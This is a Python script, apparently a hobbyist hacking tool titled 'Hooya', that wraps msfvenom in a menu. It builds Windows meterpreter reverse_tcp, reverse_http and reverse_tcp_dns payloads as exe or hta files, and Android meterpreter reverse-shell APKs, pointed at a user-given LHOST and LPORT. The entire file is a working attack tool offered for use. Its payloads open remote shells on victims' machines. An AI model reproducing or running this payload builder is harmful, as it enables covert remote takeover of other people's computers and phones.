#Made by NorthX

import os 
import sys
import time

#########################  
WHITE = "\033[1;37;40m\n"#
YELLOW = "\033[1;33;40m\n"#
GREEN  = "\033[1;32;40m\n"#
RED = "\033[1;31;40m\n"#
BLUE  = "\033[1;34;40m\n"#
#########################
##################################

##########
#ROOT
##### 
if os.geteuid() != 0:
    exit(RED + "You need to run the script as root")
#######################################################3    
print("\nStarting msf services ...\n")
time.sleep(3)
os.system("clear")
os.system("sudo msfstart")
os.system("reset")  
time.sleep(3)
os.system("service postgresql start")    
os.system("reset")
time.sleep(2)
os.system("service apache2 stop")
os.system("reset")  
  
  
  

  
def Banner():
    print(RED + """
  

                                                  [Hooya]
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
      (The easier it is, the more lazy you become|Google Translate 2019) 
  
                                           """)

def menu():
    menuitems = "\n" "\033[1;34;40m1)Windows\n\n\r""\033[1;32;40m2)Android\n\n\r""\033[1;31;40m99)Exit\n\n\r"
    print(menuitems)
    option = int(input("\n\033[1;37;40m> "))
    if option == 1:
        time.sleep(2)
        Win()
    elif option == 2:
	    Andr()
    elif option == 99:
          exit("Ceeya!")	
    
    
Banner()    
 
 
 
 
 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
###################################################################################         
def Win():
    print("\033[1;34;40m\n")
    winmenu = "\n" "1)meterpreter/reverse_tcp (I know you are here for it...)\n\n""2)meterpreter/reverse_http\n\n""3)meterpreter/reverse_tcp_dns\n\n""\033[1;31;40m99)Main menu\n\n"
    print()
    print(winmenu)
    print("<--------------------------------------------------------------------------------------->")
    winchoice = int(input("Choose an option > "))
    if winchoice == 1:
        exe_or_hta = input("exe or hta :  ") 
        winHOST = str(input("Enter LHOST > "))
        winPORT = str(input("Enter LPORT > "))
        output = input("Enter payload name > ")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -i 43 -o %s.%s" % (winHOST, winPORT, output, exe_or_hta))
    elif winchoice == 2:
          exe_or_hta = input("exe or hta : ") 
          httpHOST = str(input("Enter LHOST > "))
          httpPORT = str(input("Enter LPORT > "))
          httpOUT = input("Enter output name > ")
          os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=%s LPORT=%s -o %s.%s " % (httpHOST, httpPORT, httpOUT, exe_or_hta))
    elif winchoice == 3:
          exe_or_hta = input("exe or hta : ") 
          dnsHOST = str(input("Enter LHOST > "))
          dnsPORT = str(input("Enter LPORT > "))
          dnsOUT = input("Enter output name > ")      
          os.system("msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=%s LPORT=%s -o %s.%s" % (dnsHOST, dnsPORT, dnsOUT, exe_or_hta))
    elif winchoice == 99:
          os.system("clear")
          menu()      
    else:
        print("Invalid option")      
        os.system("reset")
        Banner()
        Win()
#######################################################################################
def Andr():
    print(GREEN)
    andmenu = "\n" "1)Reverse_tcp\n\n""2)Reverse_http\n\n""3)Reverse_https\n\n""\033[1;31;40m99)Main menu\n\n"	
    print(andmenu)
    andchoice = int(str(input("Choose an androption (got it ??) : ")))
    if andchoice == 1:
        andHOST = str(input("Enter  LHOST : "))
        andPORT = str(input("Enter LPORT :  "))
        andOUT = input("Enter output name :  ")
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk" % (andHOST, andPORT, andOUT))	
        print(WHITE + "Save as %s" % (andOUT) )
    elif andchoice == 2: 
          andHOST = str(input("Enter LHOST : "))	 
          andOUT = input("Enter output name : ")
          andPORT = str(input("Enter LPORT : "))
          os.system("msfvenom -p android/meterpreter/reverse_http LHOST=%s LPORT=%s R > %s.apk" % (andHOST, andPORT, andOUT))
          print(WHITE +"Saved as %s "  % (andOUT))
    elif andchoice == 3:
          andHOST = str(input("Enter LHOST : "))
          andPORT = str(input("Enter LPORT : "))
          andOUT = input("Enter output name : ") 
          os.system("msfvenom -p android/meterpreter/reverse_https LHOST=%s LPORT=%s R > %s.apk" % (andHOST, andPORT, andOUT))   
          print(WHITE + "Save as %s" % (andOUT))
    elif andchoice == 99:
          os.system("reset")
          Banner()         
          menu() 
    else:
        print("Invalid option") 
        os.system("reset")
        Banner()
        Andr()


####################################################################################################





























menu()




